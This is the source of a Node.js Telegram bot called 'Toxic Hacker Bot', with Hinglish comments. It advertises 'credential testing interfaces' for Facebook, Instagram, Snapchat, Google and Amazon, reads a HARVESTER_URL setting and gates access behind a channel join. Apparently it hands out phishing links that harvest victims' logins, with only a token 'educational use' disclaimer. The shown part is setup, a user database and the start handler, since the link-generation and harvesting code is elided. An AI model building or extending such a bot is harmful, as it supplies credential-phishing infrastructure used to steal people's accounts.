const { Telegraf, Markup } = require('telegraf');
const fs = require('fs');
const http = require('http');

// --- ⚙️ CONFIGURATION ---
const BOT_TOKEN = process.env.BOT_TOKEN;
const HARVESTER_URL = process.env.HARVESTER_URL;
const OWNER_ID = process.env.OWNER_ID; 
const CHANNEL_ID = process.env.CHANNEL_ID;
const CHANNEL_LINK = process.env.CHANNEL_LINK;

if (!BOT_TOKEN || !HARVESTER_URL || !OWNER_ID || !CHANNEL_ID || !CHANNEL_LINK) {
    console.error("FATAL ERROR: One or more environment variables are missing.");
    process.exit(1);
}

const bot = new Telegraf(BOT_TOKEN);
const DB_PATH = './db.json';
let adminState = {};

// --- DB Functions ---
const readDb = () => {
    if (!fs.existsSync(DB_PATH)) {
        fs.writeFileSync(DB_PATH, JSON.stringify({ users: {}, admins: [parseInt(OWNER_ID)], blocked_users: [] }, null, 2));
    }
    return JSON.parse(fs.readFileSync(DB_PATH));
};
const writeDb = (data) => fs.writeFileSync(DB_PATH, JSON.stringify(data, null, 2));
const isAdmin = (id) => readDb().admins.includes(parseInt(id));

// --- NAYA UPGRADE: Markdown Sanitizer ---
// Yeh function username se saare khaas characters ko neutral kar dega
const escapeMarkdown = (text) => {
    return text.replace(/[_*[\]()~`>#+\-=|{}.!]/g, '\\$&');
};

// --- Start Message ---
const startMessage = `
🔥 *TOXIC HACKER BOT*

🔗 *Credential Testing Interfaces:*
• Facebook
• Instagram
• Snapchat
• Google
• Amazon

🎯 *For Educational Use Only!*
❌ Illegal Use is Prohibited.
✅ Ethical Hacking | OSINT | Red Teaming

Join: @ToxicBack2025
`;

// --- KEYBOARDS ---
const adminKeyboard = Markup.inlineKeyboard([ /* ... (Waisa hi) ... */ ]);
const linkGenerationKeyboard = Markup.inlineKeyboard([ /* ... (Waisa hi) ... */ ]);

// --- /start COMMAND ---
bot.start(async (ctx) => {
    const userId = ctx.from.id;
    const username = ctx.from.username ? `@${ctx.from.username}` : ctx.from.first_name;
    const db = readDb();

    if (db.blocked_users.includes(userId)) return;

    try {
        const chatMember = await ctx.telegram.getChatMember(CHANNEL_ID, userId);
        if (!['member', 'administrator', 'creator'].includes(chatMember.status)) throw new Error();

        if (!db.users[userId]) {
            db.users[userId] = { username, joinDate: new Date().toISOString() };
            writeDb(db);
            
            // NAYA FIX: Username ko sanitize karo
            const safeUsername = escapeMarkdown(username);
            const notificationText = `*New User Joined*\n\n- *User:* ${safeUsername}\n- *ID:* \`${userId}\``;
            
            // NAYA FIX: MarkdownV2 ka istemal karo
            ctx.telegram.sendMessage(OWNER_ID, notificationText, { parse_mode: 'MarkdownV2' });
        }

        if (isAdmin(userId)) {
            ctx.replyWithMarkdown('👑 *Admin Panel Activated*', adminKeyboard);
        } else {
            ctx.replyWithMarkdown(startMessage, Markup.inlineKeyboard(linkGenerationKeyboard.reply_markup.inline_keyboard.slice(0, -1)));
        }
    } catch {
        ctx.replyWithMarkdown(`🛑 *ACCESS DENIED*\n\nJoin our channel to continue.`, Markup.inlineKeyboard([
            [Markup.button.url('➡️ Join Channel', CHANNEL_LINK)],
            [Markup.button.callback('✅ I Joined', 'check_join')]
        ]));
    }
});

// ... (Baaki saara code - callback_query, text handler, stay-alive server - waisa hi rahega) ...

bot.launch();
console.log('🔥 Toxic Hacker Bot (Sanitized) is online.');
